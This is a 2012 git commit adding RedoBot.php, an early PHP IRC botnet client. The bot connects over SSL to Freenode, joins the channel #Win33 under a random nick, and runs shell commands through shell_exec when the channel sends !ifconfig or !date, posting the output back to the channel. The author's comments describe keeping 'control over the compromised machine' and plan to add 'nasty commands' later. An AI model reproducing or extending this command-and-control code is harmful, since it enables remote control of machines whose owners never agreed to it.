940bbf11b839db23298f6e0347437b79c5b392cb
kurtcc <pritzel@gmail.com>
2012-10-15 10:28:51 +0200

    Added RedoBot.php it can connect ot irc via SSL, also changed README in Parts/IRCBOT

---
+++ Parts/IRCBOT/RedoBot.php
@@ -0,0 +1,95 @@
+<?php
+/* kurtcc
+Yes this code looks ugly but just want to see if it works, will make code more elegant later and add error handling, right now let's assume everything 
+just works fine. Ok? Great. */
+
+//Keep script running! 
+// The default time limit is 30 seconds.
+set_time_limit(0); 
+ini_set('display_errors', 'on'); // We can see the output from the server.
+
+
+
+//Open socket to Freenode IRC Network.
+//$socket = fsockopen("irc.freenode.net", 6667);
+// $socket = fsockopen("irc.freenode.net", 6697); See if this gets us to connect via SSL
+$socket = fsockopen('ssl://' . "irc.freenode.net", 6697);
+
+
+// Send text to the server: fputs();
+// fputs(socket variable aka where data needs to go, text that needs to be sent goes here.\n);
+// Remember \n newline at end of each message to server, this seperates commands  so instead of /nick thisnick /identify it becomes
+// /nick thisnick 
+// /identify fefeafeaf
+
+
+// Each bot joining the channel needs a unique for us to keep control over the compromised machine.
+//The following code solves the problem. (I hope.)
+$rand = getrandmax();
+$nick = md5($rand);
+$better = mt_rand();
+$name = sha1($better);
+$real = sha1($rand);
+//$name = md5(getrandmax());
+
+
+// This was working: fputs($socket, "NICK PHPBotNet\n");
+// This was also working: fputs($socket,"USER PHPBotNet anapnea.net PHPBotNet :kurtcc bruno\n"); //(nick host nick:realname)
+fputs($socket, "NICK $nick\n"); //Um sorry anapnea, what host could I put here ?
+fputs($socket,"USER $nick bshellz.net $nick :$name $real\n"); //(nick host nick:realname)
+
+
+
+// Join the channel of choice.
+// This variable should later be coded to be easily alternated
+// as well as the server.
+
+fputs($socket,"JOIN #Win33\n"); // 
+
+while(1) { // Until one decides to change its value this script will stay running.
+
+// fgets() function returns text the server is sending us. We then store the text received from the server into a variable.
+	while($data = fgets($socket,128)) {
+		echo nl2br($data);
+		flush();
+
+		// Seperate the strings we receive from the server. Use explode() function for this.
+		// Data seperated by explode() function will be saved into an array named $ex
+		$ex = explode( ' ' , $data);
+
+		//Gonna receive ping with unique code, send back pong + unique code
+		if($ex[0] == "PING") {
+			fputs($socket, "PONG".$ex[1]."\n");
+		}
+			// Say something in the channel
+		$command = str_replace(array(chr(10), chr(13)), '', $ex[3]);
+		if ($command == ":!ifconfig") {
+			
+			$cmdd = "ifconfig";
+			$output = shell_exec($cmdd);
+			fputs($socket, "PRIVMSG ".$ex[2]." $output\n");
+
+
+// Just few random commands that will give output, I'll add the nasty commands later with arguments
+			// THis is work in progress.
+			// Output is still probably just one word, should try get a way of formatting output better and preserving spaces.
+			// This is just a test of some of the code I am going to use so everything is just ugly, the code in /Parts is also
+			// just pieces of code I was testing.
+
+		}
+	if ($command == ":!date") {
+			
+			$cmdd = "date";
+			$output = shell_exec($cmdd);
+			fputs($socket, "PRIVMSG ".$ex[2]." $output\n");
+
+
+
+
+		}
+	
+
+
+}
+}
+?>
